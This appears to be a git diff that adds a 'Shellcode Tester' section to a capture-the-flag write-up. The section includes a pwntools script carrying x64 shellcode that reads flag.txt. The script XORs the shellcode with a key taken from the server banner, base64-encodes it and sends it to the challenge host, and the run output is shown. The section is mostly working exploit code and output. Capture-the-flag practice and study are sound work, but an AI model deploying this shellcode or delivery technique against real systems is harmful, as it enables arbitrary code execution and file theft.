@@ -225,3 +225,76 @@ Enter your character name: Welcome BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBs\x12
 Goodbye!
 $ 
 ```
+
+
+# Shellcode Tester
+
+This challenge was pretty much straight forward, the goal is to provide a shellcode that can read flag.txt. 
+
+```bash
+nc pwn.ctf.ae 1221
+
+     _          _ _               _         _            _
+ ___| |__   ___| | | ___ ___   __| | ___   | |_ ___  ___| |_ ___ _ __
+/ __| '_ \ / _ \ | |/ __/ _ \ / _` |/ _ \  | __/ _ \/ __| __/ _ \ '__|
+\__ \ | | |  __/ | | (_| (_) | (_| |  __/  | ||  __/\__ \ ||  __/ |
+|___/_| |_|\___|_|_|\___\___/ \__,_|\___|___\__\___||___/\__\___|_|
+                                       |_____|
+----------------------------------------------------------------------------------
+Welcome! You can send any shellcode you want (100 bytes limit) and it will be executed after each byte is XOR'd with a random key!
+Keep in mind this instance is extremely firewalled so no reverse/bind shells are allowed!
+----------------------------------------------------------------------------------
+
+
+Please send your base64 encoded x64 shellcode that will be XOR'd with 0xb6 and executed:
+
+
+```
+
+sor our shellcode will be XORed the base64 decoded, and then it will be executed.. I am not sure what is the purpose of this, but lets go with the flow. [Googling](http://blog.dornea.nu/2016/08/23/testing-shellcodes/ "Googling") for a 64 bit shellcode that reads flag.txt and found one.
+
+So our goal is as the following: 
+1- Find the appropiate shellcode
+2-XOR it with whatever the server replies
+3- base64 encode it
+
+```python
+from pwn import *
+import re
+import base64
+r = remote("pwn.ctf.ae",1221)
+
+r.recv()
+
+shellcode="\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x66\x6c\x61\x67\x2e\x74\x78\x74"
+txt =r.recv()
+
+key = re.search("XOR'd with (.*) and",txt)
+
+if key:
+	key = int(key.group(1),16)
+	print(shellcode)
+	payload = xor(shellcode,key)
+	print(payload)
+	payload = base64.b64encode(payload)
+	print(payload)
+
+r.sendline(payload)
+r.stream()
+```
+
+Exectuing the script should give the flag.txt content. 
+
+
+```bash
+$ python solve.py 
+[+] Opening connection to pwn.ctf.ae on port 1221: Done
+�?_\x80w\x0bH1�H1�f\x81��H\x8d4$H\x89�H1�f\xba\xff\x0f1�\x051\xff@\x80�H\x89�H1�\x0fH1�<\x0f��\xff\xffflag.txt
+�%E�m\x11R+�\x18+�|\x9b��R\x97.>R\x93�R+�|\xa0�R+�\x1f+�Z��\x93�R+�\x1b\x15R+�&\x15����|v{}4nbn
+8SVFmm0RW1Ir2h4YUivsFR98m/blFVKXLj5Sk91SK8h8oOUVUivaFR9SK+Vamt0bUpPYUivaHhsVH1Ir2h4mFR/ypuXl5Xx2e300bmJu
+Shellcode Length: 78
+Decoded and XOR'd shellcode: \xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x66\x6c\x61\x67\x2e\x74\x78\x74
+Shellcode Output: 
+Error executing shellcode. Command '['/tmp/tmpzbfqs849/shellcode']' returned non-zero exit status 1.
+[*] Closed connection to pwn.ctf.ae port 1221
+```
